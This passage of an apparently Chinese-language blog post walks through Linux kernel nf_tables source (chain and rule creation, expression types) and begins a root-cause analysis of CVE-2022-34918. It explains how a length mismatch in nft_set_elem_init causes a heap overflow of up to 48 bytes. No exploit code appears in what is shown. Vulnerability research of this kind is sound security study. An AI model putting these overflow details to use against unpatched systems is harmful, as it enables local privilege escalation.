&#123;</span><br><span class="line">			NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);</span><br><span class="line">			<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		policy = ntohl(nla_get_be32(nla[NFTA_CHAIN_POLICY]));</span><br><span class="line">		<span class="keyword">switch</span> (policy) &#123;</span><br><span class="line">		<span class="keyword">case</span> NF_DROP:</span><br><span class="line">		<span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_CHAIN_FLAGS])</span><br><span class="line">		flags = ntohl(nla_get_be32(nla[NFTA_CHAIN_FLAGS]));</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (chain)</span><br><span class="line">		flags = chain-&gt;flags;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~NFT_CHAIN_FLAGS)</span><br><span class="line">		<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">	nft_ctx_init(&amp;ctx, net, skb, info-&gt;nlh, family, table, chain, nla);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (chain != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">			NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line">			<span class="keyword">return</span> -EEXIST;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line">			<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">		flags |= chain-&gt;flags &amp; NFT_CHAIN_BASE;</span><br><span class="line">		<span class="keyword">return</span> nf_tables_updchain(&amp;ctx, genmask, policy, flags, attr,</span><br><span class="line">					  extack); <span class="comment">/* 找到chain则更新 */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> nf_tables_addchain(&amp;ctx, family, genmask, policy, flags, extack); <span class="comment">/* 未找到就调用该函数进行创建 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建 rule &amp; expression 的函数：nf_tables_newrule</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newrule</span><span class="params">(struct sk_buff *skb, <span class="keyword">const</span> struct nfnl_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">			     <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(info-&gt;net);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> *<span class="title">extack</span> =</span> info-&gt;extack;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size, i, n, ulen = <span class="number">0</span>, usize = <span class="number">0</span>;</span><br><span class="line">	u8 genmask = nft_genmask_next(info-&gt;net);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">rule</span>, *<span class="title">old_rule</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_info</span> *<span class="title">expr_info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	u8 family = info-&gt;nfmsg-&gt;nfgen_family;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_flow_rule</span> *<span class="title">flow</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> info-&gt;net;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_userdata</span> *<span class="title">udata</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line">	u64 handle, pos_handle;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tmp</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err, rem;</span><br><span class="line"></span><br><span class="line">	lockdep_assert_held(&amp;nft_net-&gt;commit_mutex);</span><br><span class="line"></span><br><span class="line">	table = nft_table_lookup(net, nla[NFTA_RULE_TABLE], family, genmask,</span><br><span class="line">				 NETLINK_CB(skb).portid); <span class="comment">/* 获取table */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">		NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_TABLE]);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_RULE_CHAIN]) &#123; <span class="comment">/* 获取chain */</span></span><br><span class="line">		chain = nft_chain_lookup(net, table, nla[NFTA_RULE_CHAIN],</span><br><span class="line">					 genmask);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">			NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_CHAIN]);</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (nft_chain_is_bound(chain))</span><br><span class="line">			<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_RULE_CHAIN_ID]) &#123;</span><br><span class="line">		chain = nft_chain_lookup_byid(net, nla[NFTA_RULE_CHAIN_ID]);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">			NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_CHAIN_ID]);</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_RULE_HANDLE]) &#123;</span><br><span class="line">		handle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_HANDLE]));</span><br><span class="line">		rule = __nft_rule_lookup(chain, handle);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(rule)) &#123;</span><br><span class="line">			NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(rule);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">			NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line">			<span class="keyword">return</span> -EEXIST;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line">			old_rule = rule;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_CREATE) ||</span><br><span class="line">		    info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		handle = nf_tables_alloc_handle(table);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (chain-&gt;use == UINT_MAX)</span><br><span class="line">			<span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (nla[NFTA_RULE_POSITION]) &#123;</span><br><span class="line">			pos_handle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_POSITION]));</span><br><span class="line">			old_rule = __nft_rule_lookup(chain, pos_handle);</span><br><span class="line">			<span class="keyword">if</span> (IS_ERR(old_rule)) &#123;</span><br><span class="line">				NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION]);</span><br><span class="line">				<span class="keyword">return</span> PTR_ERR(old_rule);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_RULE_POSITION_ID]) &#123;</span><br><span class="line">			old_rule = nft_rule_lookup_byid(net, nla[NFTA_RULE_POSITION_ID]);</span><br><span class="line">			<span class="keyword">if</span> (IS_ERR(old_rule)) &#123;</span><br><span class="line">				NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION_ID]);</span><br><span class="line">				<span class="keyword">return</span> PTR_ERR(old_rule);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	nft_ctx_init(&amp;ctx, net, skb, info-&gt;nlh, family, table, chain, nla);</span><br><span class="line"></span><br><span class="line">	n = <span class="number">0</span>;</span><br><span class="line">	size = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_RULE_EXPRESSIONS]) &#123; <span class="comment">/* 若设置了nla[NFTA_RULE_EXPRESSIONS],会先把所有的expression遍历出来,计算其总值放在size中 */</span></span><br><span class="line">		expr_info = kvmalloc_array(NFT_RULE_MAXEXPRS,</span><br><span class="line">					   <span class="keyword">sizeof</span>(struct nft_expr_info),</span><br><span class="line">					   GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!expr_info)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">		nla_for_each_nested(tmp, nla[NFTA_RULE_EXPRESSIONS], rem) &#123;</span><br><span class="line">			err = -EINVAL;</span><br><span class="line">			<span class="keyword">if</span> (nla_type(tmp) != NFTA_LIST_ELEM)</span><br><span class="line">				<span class="keyword">goto</span> err_release_expr;</span><br><span class="line">			<span class="keyword">if</span> (n == NFT_RULE_MAXEXPRS)</span><br><span class="line">				<span class="keyword">goto</span> err_release_expr;</span><br><span class="line">			err = nf_tables_expr_parse(&amp;ctx, tmp, &amp;expr_info[n]);</span><br><span class="line">			<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">				NL_SET_BAD_ATTR(extack, tmp);</span><br><span class="line">				<span class="keyword">goto</span> err_release_expr;</span><br><span class="line">			&#125;</span><br><span class="line">			size += expr_info[n].ops-&gt;size;</span><br><span class="line">			n++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* Check for overflow of dlen field */</span></span><br><span class="line">	err = -EFBIG;</span><br><span class="line">	<span class="keyword">if</span> (size &gt;= <span class="number">1</span> &lt;&lt; <span class="number">12</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_release_expr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_RULE_USERDATA]) &#123; <span class="comment">/* 若设置了nla[NFTA_RULE_USERDATA],获取userdata的大小放在usize中 */</span></span><br><span class="line">		ulen = nla_len(nla[NFTA_RULE_USERDATA]);</span><br><span class="line">		<span class="keyword">if</span> (ulen &gt; <span class="number">0</span>)</span><br><span class="line">			usize = <span class="keyword">sizeof</span>(struct nft_userdata) + ulen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = -ENOMEM;</span><br><span class="line">	rule = kzalloc(<span class="keyword">sizeof</span>(*rule) + size + usize, GFP_KERNEL); <span class="comment">/* 分配内存,创建一个rule,并初始化相关数据域 */</span></span><br><span class="line">	<span class="keyword">if</span> (rule == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_release_expr;</span><br><span class="line"></span><br><span class="line">	nft_activate_next(net, rule);</span><br><span class="line"></span><br><span class="line">	rule-&gt;handle = handle;</span><br><span class="line">	rule-&gt;dlen   = size;</span><br><span class="line">	rule-&gt;udata  = ulen ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ulen) &#123;</span><br><span class="line">		udata = nft_userdata(rule);</span><br><span class="line">		udata-&gt;len = ulen - <span class="number">1</span>;</span><br><span class="line">		nla_memcpy(udata-&gt;data, nla[NFTA_RULE_USERDATA], ulen);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	expr = nft_expr_first(rule);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		err = nf_tables_newexpr(&amp;ctx, &amp;expr_info[i], expr);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			NL_SET_BAD_ATTR(extack, expr_info[i].attr);</span><br><span class="line">			<span class="keyword">goto</span> err_release_rule;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (expr_info[i].ops-&gt;validate)</span><br><span class="line">			nft_validate_state_update(net, NFT_VALIDATE_NEED);</span><br><span class="line"></span><br><span class="line">		expr_info[i].ops = <span class="literal">NULL</span>;</span><br><span class="line">		expr = nft_expr_next(expr);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (chain-&gt;flags &amp; NFT_CHAIN_HW_OFFLOAD) &#123;</span><br><span class="line">		flow = nft_flow_rule_create(net, rule);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(flow)) &#123;</span><br><span class="line">			err = PTR_ERR(flow);</span><br><span class="line">			<span class="keyword">goto</span> err_release_rule;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE) &#123;</span><br><span class="line">		err = nft_delrule(&amp;ctx, old_rule);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> err_destroy_flow_rule;</span><br><span class="line"></span><br><span class="line">		trans = nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule);</span><br><span class="line">		<span class="keyword">if</span> (trans == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			err = -ENOMEM;</span><br><span class="line">			<span class="keyword">goto</span> err_destroy_flow_rule;</span><br><span class="line">		&#125;</span><br><span class="line">		list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		trans = nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule);</span><br><span class="line">		<span class="keyword">if</span> (!trans) &#123;</span><br><span class="line">			err = -ENOMEM;</span><br><span class="line">			<span class="keyword">goto</span> err_destroy_flow_rule;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_APPEND) &#123;</span><br><span class="line">			<span class="keyword">if</span> (old_rule)</span><br><span class="line">				list_add_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;chain-&gt;rules);</span><br><span class="line">		 &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (old_rule)</span><br><span class="line">				list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				list_add_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;chain-&gt;rules);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	kvfree(expr_info);</span><br><span class="line">	chain-&gt;use++;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flow)</span><br><span class="line">		nft_trans_flow_rule(trans) = flow;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nft_net-&gt;validate_state == NFT_VALIDATE_DO)</span><br><span class="line">		<span class="keyword">return</span> nft_table_validate(net, table);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_destroy_flow_rule:</span><br><span class="line">	<span class="keyword">if</span> (flow)</span><br><span class="line">		nft_flow_rule_destroy(flow);</span><br><span class="line">err_release_rule:</span><br><span class="line">	nf_tables_rule_release(&amp;ctx, rule);</span><br><span class="line">err_release_expr:</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (expr_info[i].ops) &#123;</span><br><span class="line">			module_put(expr_info[i].ops-&gt;type-&gt;owner);</span><br><span class="line">			<span class="keyword">if</span> (expr_info[i].ops-&gt;type-&gt;release_ops)</span><br><span class="line">				expr_info[i].ops-&gt;type-&gt;release_ops(expr_info[i].ops);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	kvfree(expr_info);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>expresssion 总共有如下多种类型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">nft_basic_types</span>[] =</span> &#123;</span><br><span class="line">	&amp;nft_imm_type,</span><br><span class="line">	&amp;nft_cmp_type,</span><br><span class="line">	&amp;nft_lookup_type,</span><br><span class="line">	&amp;nft_bitwise_type,</span><br><span class="line">	&amp;nft_byteorder_type,</span><br><span class="line">	&amp;nft_payload_type,</span><br><span class="line">	&amp;nft_dynset_type,</span><br><span class="line">	&amp;nft_range_type,</span><br><span class="line">	&amp;nft_meta_type,</span><br><span class="line">	&amp;nft_rt_type,</span><br><span class="line">	&amp;nft_exthdr_type,</span><br><span class="line">	&amp;nft_last_type,</span><br><span class="line">	&amp;nft_counter_type,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>漏洞来自于 CVE-2022-34918，函数 <code>nft_set_elem_init</code> 存在堆溢出，溢出长度可达 <code>64-16=48</code> 字节，漏洞对象可以位于 <code>kmalloc-&#123;64,96,128,192&#125;</code></p>
<p>先看 <code>nft_set_elem_init</code> 函数的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">nft_set_elem_init</span><span class="params">(<span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">const</span> struct nft_set_ext_tmpl *tmpl,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">const</span> u32 *key, <span class="keyword">const</span> u32 *key_end,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">const</span> u32 *data, u64 timeout, u64 expiration, <span class="keyword">gfp_t</span> gfp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *elem;</span><br><span class="line"></span><br><span class="line">	elem = kzalloc(<span class="built_in">set</span>-&gt;ops-&gt;elemsize + tmpl-&gt;len, gfp); <span class="comment">/* 这里的tmpl-&gt;len已经包括了desc.dlen */</span></span><br><span class="line">	<span class="keyword">if</span> (elem == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	ext = nft_set_elem_ext(<span class="built_in">set</span>, elem);</span><br><span class="line">	nft_set_ext_init(ext, tmpl);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_KEY))</span><br><span class="line">		<span class="built_in">memcpy</span>(nft_set_ext_key(ext), key, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line">	<span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_KEY_END))</span><br><span class="line">		<span class="built_in">memcpy</span>(nft_set_ext_key_end(ext), key_end, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line">	<span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))</span><br><span class="line">		<span class="built_in">memcpy</span>(nft_set_ext_data(ext), data, <span class="built_in">set</span>-&gt;dlen); <span class="comment">/* 如果set-&gt;dlen不等于desc.dlen,则有可能发生溢出 */</span></span><br><span class="line">	<span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_EXPIRATION)) &#123;</span><br><span class="line">		*nft_set_ext_expiration(ext) = get_jiffies_64() + expiration;</span><br><span class="line">		<span class="keyword">if</span> (expiration == <span class="number">0</span>)</span><br><span class="line">			*nft_set_ext_expiration(ext) += timeout;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_TIMEOUT))</span><br><span class="line">		*nft_set_ext_timeout(ext) = timeout;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> elem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>memcpy</code> 使用的拷贝长度来自于 <code>nft_set</code> 对象，但拷贝的目标是 <code>nft_set_ext</code>，其大小来自于 <code>nft_set_ext_tmpl</code> 对象</li>
<li>如果 <code>kzalloc</code> 申请的大小和 <code>memcpy</code> 拷贝的大小不匹配，则可能发生堆溢出</li>
</ul>
<p>两个关键结构体的条目如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> &#123;</span></span><br><span class="line">	u8	genmask;</span><br><span class="line">	u8	offset[NFT_SET_EXT_NUM];</span><br><span class="line">	<span class="keyword">char</span>	data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
